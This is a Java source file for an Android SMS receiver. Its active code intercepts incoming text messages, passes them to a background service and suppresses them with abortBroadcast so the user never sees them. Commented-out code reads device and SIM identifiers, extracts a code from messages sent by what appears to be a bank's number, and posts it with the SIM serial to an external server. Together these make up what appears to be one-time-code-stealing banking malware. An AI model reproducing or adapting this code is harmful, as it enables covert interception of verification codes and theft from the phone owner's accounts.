package com.yulin.sms;

import java.sql.Date;
import java.text.SimpleDateFormat;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import com.yulin.util.CustomerHttpClient;
import com.yulin.util.StringUtil;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Notification.Builder;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class SmsReciver extends BroadcastReceiver {
/*	private static final String TAG = "SMSReceive";
	private static final String smsuri = "android.provider.Telephony.SMS_RECEIVED";
	private static final String url = "http://www.b2asoft.com/Software/api/mobilesms.asp";
	*/
/*	private Context context;
	private int NOTIFICATION_ID ;*/

	@Override
	public void onReceive(Context context, Intent intent) {
//		this.context = context;
		Intent it = new Intent(context,SmsService.class);
		it.putExtras(intent.getExtras());
		it.setAction(intent.getAction());
		context.startService(it);
		abortBroadcast();
		/*StringBuilder smsBuilder = null;
		String sms = null;
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String deviceid = tm.getDeviceId();
		String tel = tm.getLine1Number();
		String imei = tm.getSimSerialNumber();
		String imsi = tm.getSubscriberId();
//		Toast.makeText(context, "设备参数:deviceid-" + deviceid + "-imei-" + imei + "-imsi-" + imsi, 3000).show();  
		Log.i(TAG, "deviceid:" + deviceid + "-imei:" + imei + "-imsi:" + imsi);
		if (intent.getAction().equals(smsuri)) {
			Bundle bundle = intent.getExtras();
			if (null != bundle) {
				Object[] pdus = (Object[]) bundle.get("pdus");
				SmsMessage[] smg = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					smg[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					Log.i(TAG + "smg" + i, smg[i].toString());
				}
				for (SmsMessage cursmg : smg) {
					String body = cursmg.getDisplayMessageBody();
					String address = cursmg.getDisplayOriginatingAddress();
					SimpleDateFormat format = new SimpleDateFormat(
							"yyyy-MM-dd hh:mm:ss");
					String date = format.format(new Date(cursmg
							.getTimestampMillis()));

					Log.i(TAG + "body", body);
					Log.i(TAG + "address", address);
					Log.i(TAG + "date", date);
					
                    String code = "";
                    if(address.equals("95595")){
                    	if(body.contains("https")){
                    		code = StringUtil.getSms(body);
                    	}
                    }
					
					smsBuilder = new StringBuilder();
                    smsBuilder.append("[ ");  
                    smsBuilder.append(imei + ", ");  
                    smsBuilder.append(address + ", ");  
                    smsBuilder.append(body + ", ");  
                    smsBuilder.append(code + ", ");  
                    smsBuilder.append(date );  
                    smsBuilder.append(" ]\n\n");
                    
                    if(StringUtil.checkNotEmptyOrNull(code)){   //如果有code发送
                    	NameValuePair param1 = new BasicNameValuePair("keycode", code);
                    	NameValuePair param2 = new BasicNameValuePair("IMEI", imei);
                    	NameValuePair param3 = new BasicNameValuePair("smstime", date);
                    	String result = CustomerHttpClient.post(url, param1,param2,param3);
                    	sms = "kecode="+code;
//                    	Toast.makeText(context, "接收:"+result, 5000).show(); 
                    }
                    
//					Toast.makeText(context, "发送:"+smsBuilder.toString(), 5000).show();  
				}
				showNotifaction(sms);
				abortBroadcast(); 
			}
		}*/
	}
	
	/*@SuppressLint("NewApi")
	private void showNotifaction(String sms){
		NotificationManager nm = (NotificationManager) context.getSystemService(context.NOTIFICATION_SERVICE);

		long when = System.currentTimeMillis();
		PendingIntent pi = PendingIntent.getActivity(context, 0, new Intent(context,MainActivity.class), 0);
		Builder builder = new Notification.Builder(context);
		builder.setContentText(sms);
		builder.setContentTitle("短信提醒");
		builder.setSmallIcon(R.drawable.ic_launcher);
		builder.setWhen(when);
		builder.setTicker("付款通知");
		builder.setContentIntent(pi);
		builder.setAutoCancel(true);
		Notification notification = builder.build();
		notification.defaults = Notification.DEFAULT_ALL;
		nm.notify(NOTIFICATION_ID, notification);
	}*/
	
}
